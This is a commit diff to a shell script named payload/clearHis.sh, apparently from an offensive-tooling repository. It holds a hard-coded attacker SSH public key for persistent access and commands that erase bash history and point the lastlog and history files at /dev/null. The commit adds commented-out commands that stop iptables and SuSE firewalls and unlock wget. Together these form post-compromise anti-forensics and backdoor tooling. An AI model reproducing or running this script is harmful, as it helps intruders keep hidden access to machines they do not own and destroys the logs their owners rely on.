ecc5f9f59041fece984993367c80b8a26ac15088
hktalent <3135773@qq.com>
2018-11-29 11:27:46 +0800

    fix

--- payload/clearHis.sh
+++ payload/clearHis.sh
@@ -1,5 +1,11 @@
 set +e
 xKeys="ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCsK7OsENqLwuH6pTrCBiNWNI0ByZZURaV+TS6l2P6cxWZpRAgVruyDk+XQ5pY9xJHTZfF75IT+ekWXA5hBe2eO8j+fAQuKaHgvlV8fTp48wMS0LRilfrslOsyv8DsrDs2ZSaiaraj7BwEBalaumczqBM0UoelCa7OvWJDqfyYK8ihQBYBXui/jvyb3FdRA9muOLFuo+AmhIyL3UMQ1jhUxrpmhAKxs6oUjMFXBj//TpvYL7AZXz+2MfmApHYSBx7vs+NodAOf9WShSPoHkuzz3riIsN3hBx66gGRGOPL00lvPsu/GS31klFKaGm3qFcHvO3uczRsaUGj89d/jUwBNh root@linuxkit-025000000001"
+# /etc/init.d/iptables stop
+# service iptables stop
+# SuSEfirewall2 stop
+# reSuSEfirewall2 stop
+# chattr -i /usr/bin/wget
+# chmod 755 /usr/bin/wget
 >~/.bash_history
 echo > ~/.bash_history
 rm -rf ~/.bash_history
@@ -19,6 +25,8 @@ history -cw
 
 export HISTFILESIZE=O
 export HISTSIZE=O
+export HISTFILE=/dev/null
+
 
 ln -sf /dev/null /var/log/lastlog
 ln -sf /dev/null ~/.bash_history
